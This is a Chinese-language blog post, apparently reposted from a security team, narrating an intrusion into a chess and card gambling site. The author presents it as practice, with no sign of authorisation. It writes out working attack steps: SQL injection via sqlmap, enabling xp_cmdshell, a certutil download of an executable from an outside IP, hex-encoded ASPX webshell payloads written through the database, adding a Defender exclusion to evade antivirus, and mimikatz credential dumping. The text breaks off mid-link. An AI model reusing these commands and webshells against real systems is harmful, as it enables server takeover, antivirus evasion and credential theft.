---
title: 某棋牌渗透记录
url: https://mp.weixin.qq.com/s/v5PInT5VuKtAXfWtx56q_A
source: Doonsec's feed
date: 2026-04-13
fetch_date: 2026-04-14T04:40:19.565275
---

# 某棋牌渗透记录

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZSTuzThL21YRovDglbFxrn9gLhAURoJJYdwkDLicCqzFh1vPtJF9AU4Q/0?wx_fmt=jpeg)

# 某棋牌渗透记录

安锐信安全攻防实验室

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于HashRun安全团队
，作者Fate@HashRun

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM5ESoWBfFvoPAHbxS9nEicTMvWMn0CpR2hoJiaANpMz7FMg/0)

**HashRun安全团队**
.

HashRun安全团队是由年轻白帽们自发组织的团队，致力于技术研究，旨在为网络安全贡献精英力量，在实战演练、大型渗透等项目中屡获佳绩；团队擅长APT技术、项目实施、入侵检测及响应、安服及线下值守、信安培训、竞赛指导、无线电、硬件DIY等。

前段时间看棋牌这套可以说是已经被打烂了，作为刚入门的我，闲着没事准备练练

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZmJOD3WfIJSCm5kwcNAxJQMca1quoJCYKmkeRbeomibj1xVvP3o59zWg/640?wx_fmt=png)

登录框注入，直接甩sqlmap，也存在弱口令

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZdp9hljEpJrVdy5ib3TgXWW9ux8Zv45T8vLGibhJcSKH54qtxXWaxyT6w/640?wx_fmt=png)

```
python .\sqlmap.py -r .\sql222.txt --dbms=mssql --random-agent --tech B --level 5 --risk 3
```

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZHGMuIleEP2UGbkMhHdzu168MWB0PW8VKXuUiaAuwORQ2w2KB0ZKcKIQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZLr8NDSiagiaIsSrdJsW4XvpOlNWQODkPOFq4NO3ibqjQRunhVwIplbvdQ/640?wx_fmt=png)

得到sqlserver

```
EXEC sp_configure'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
```

盲开xpshell.

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZxMDXdYNNODrLSjZLl7TDNNhibicg8en3AIiaTHHBd5NUibrGNUibJiaZqTVA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZdeWGTQnnenKdEuWt6j5JEUO3yGOxuuO8KGFiaiaBl8CNFWRhXcPJ8PYA/640?wx_fmt=png)

成功接受到，尝试直接powershell CS上线，但是对方有杀软

```
userName=' WAITFOR DELAY '0:0:1'EXEC master..xp_cmdshell 'whoami'-- wWjW&password=123456&verify=
```

curl判断出网、站库不分离,准备上马，但是太菜失败嗷

```
cmd /c certutil.exe -urlcache -split -f http://124.223.118.40/chrome.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZibrayibYCAvVZIhRXB23iblGt9yFmht49ribW6QPgjbibEgS8rUibcfhq94w/640?wx_fmt=png)

```
python sqlmap.py -r sql222.txt --os-shell --proxy="http://127.0.0.1:8080" --dbms="mssql" --os-shell --tech=S
```

还得用sqlmap来搞，我写weblshell还不行嘛

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZo24h98hPpUL1bpAhM33yTCQ5BszY9ibSbGCcjD8Lg4qibibyufZWiapMAw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZU8Jf7xXwibu9KpZGqibq9vE3dApyiagxLn4yKqnOXv0p3FXUuzG4062gA/640?wx_fmt=png)

sqlmap能回显但是太慢

```
cmd /c "for /f %i in ('dir /s /b c:\2c4ef358-b3a3-4d79-8046-64888f56451a.png') do (echo %i> %i.path.txt)" 判断网站路径
```

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZyNicGOBeQUU9mynIHvOHPwo5HROvicXDiaBLHjiaVibOgnFnkcoa2wdeS9g/640?wx_fmt=png)

```
http://xxxxxxx/Scripts/jquery-1.10.2.min.js.path.txtd:\网站\后台\scripts\jquery-1.10.2.min.js
```

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZLmC1MCpALycLicbUpOCsGcyuIPkhzcfmwBicpnQTb3PkM3tdtxiazxNibg/640?wx_fmt=png)

sqlmap写不了嗷 使用burp可，接着写个小马

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZT63JAFKyabpB3WNAc5CqtBcuWdAFRNfpO1Duc1YPIibBiaHEX8jdeqIg/640?wx_fmt=png)

写进去不大对劲草，写了一个.txt这个错误，难道被解析了？

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZD4jxVzeStQibJQicOVuAiaEn5LmIAT2mKC4KRtcv00icfEbiaI78mXxR45Q/640?wx_fmt=png)

aspx可以写，然后就没有然后

```
<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["z"],"unsafe"));%>
^<%@ Page Language="C#" %^>^<%@Import Namespace="System.Reflection"%^>^<%Session.Add("k","e45e329feb5d925b"); byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%^>%27%3BDECLARE%20%40nsqt%20VARCHAR%288000%29%3BSET%20%40nsqt%3D0x6563686f205e3c25402050616765204c616e67756167653d2243232220255e3e5e3c2540496d706f7274204e616d6573706163653d2253797374656d2e5265666c656374696f6e22255e3e5e3c2553657373696f6e2e41646428226b222c226534356533323966656235643932356222293b20627974655b5d206b203d20456e636f64696e672e44656661756c742e47657442797465732853657373696f6e5b305d202b202222292c63203d20526571756573742e42696e6172795265616428526571756573742e436f6e74656e744c656e677468293b417373656d626c792e4c6f6164286e65772053797374656d2e53656375726974792e43727970746f6772617068792e52696a6e6461656c4d616e6167656428292e437265617465446563727970746f72286b2c206b292e5472616e73666f726d46696e616c426c6f636b28632c20302c20632e4c656e67746829292e437265617465496e7374616e636528225522292e457175616c732874686973293b255e3e203e643a5ccdf8d5be5cbaf3cca85c3131312e61737078%3BEXEC%20master..xp_cmdshell%20%40nsqt--
```

这里编码要注意

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZMEwrDD5E3AH0KXN2G5T7fFdZ437WTyko2gzlSrXPqXs8OLwfggicSxQ/640?wx_fmt=png)

```
echo ^<%@ Page Language="C#" %^>^<%@Import Namespace="System.Reflection"%^>^<%Session.Add("k","e45e329feb5d925b"); byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%^> >d:\网站\后台\111.aspx
```

最后换成冰蝎的马过了

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZ7AmwdGiczjUOz9c8w7JArkN4J0ujibgpV3lPiaib3043ujSEfgRe2z0Qmg/640?wx_fmt=png)

权限超级小需要提权，md

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZjF8EXRdJaKHpAOWTzcyxkPIiaSVLSrFdibfYYooGniajeCcibbuAhgswlA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZnYvOHUN8MSuSCtbVibEp8egjgvabTGcwm7VUvkib8spy7b6r5nRribDFA/640?wx_fmt=png)

真牛逼啊

先换一个目录写马 才看一波杀软

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZG6PaafeZuy3yvtic3qscuWwVibexqAfkwF8wUv0yZkt5sNGOqRCVCdnA/640?wx_fmt=png)

这就不好办了呀，能关吗？当然得试试是把，先登录上数据库看看

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZyS2ANTsiaF0r5mlBqoKXJiaRpGGh2CCjWcpMtBOagFRQ6oN7wddjWF7w/640?wx_fmt=png)

```
powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath "D:\etc-0701\GameServer1"
```

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZcV0JNQRTK9e08eFBVpdUicTtsnoOia79ub7N4fqCKtU0ibWHsicmlpRXLA/640?wx_fmt=png)

没过一会就被杀了 草 落地没被杀 在通信过程中无了，说明免杀这条路还是不错，不过我选择上哥斯拉看看

bypassAV

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZsAPkqr8NV3PB5xOv7qIu6WWEyjNe2Y9OglKIKa8bFOMVuNGq7PpBtg/640?wx_fmt=png)

我搞免杀还不行嘛淦

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZaGfUIywa3okGOImNu03cggAmonuLLbywZDavnLrFGhyqSNhaG35xyQ/640?wx_fmt=png)

次上线很OK,ok个der没执行几个命令就掉

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZNSvGeLD4Vm4sK2iaF0H6DnFgPq0M6bEWDfOibndGX6ja0VW61nrJ0Aqw/640?wx_fmt=png)

免杀powershell上线

```
cmd /c powershell -executionpolicy bypass -File
```

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZNHM7DBeCBVpZ3PS3NVYdf1jf7r0YXDOCfsjLXF54IgVyF6U1fAicdRA/640?wx_fmt=png)

再N次上线，想抓密码的真难抓啊

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZut6bGe6zpibXCxe4yE18bM3JNTY1BYJpGeQQ3o0so1wnM91e62Vd2Tg/640?wx_fmt=png)

提权、哟！直接添加用户连接上去

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZicB1ib8OGKgF45zo0UmU1WzcDliaVEItlMaicxWpqDHiaWwnQPwtH6icjvNg/640?wx_fmt=png)

关掉嗷 明明白白

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZAedicMCuIt3a9LHT9Khfrzkux5icyEia8vgibccTsciaGDmUpxteo07uwPw/640?wx_fmt=png)

```
privilege::debugsekurlsa::logonpasswords
```

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZqPXZtyntMacnOibpWRhc0HPHM9tXRsaibqRVjAHkE2KSyBiaOYfKZcGeA/640?wx_fmt=png)

参考原因：https://blog.csdn.net/m0\_46622606/article/details/105350970

隔了这么久，今天突然看到一个公众号，想起来是不是因为文章中写的补丁原因，准备尝试一下，现在mimikatz已经更新到了2.2.0版本，还没卸载补丁试了下，直接就可以读到HASH了，原因并不清楚，但是现在算是解决了

![](https://mmbiz.qpic.cn/mmbiz_png/YzeH19nzlHZtGwYUFKOmvJO63yosKFdZbYpHjYjqM4lMbjT8G7oJuXWYtkrDUnjo3ibPLibuC...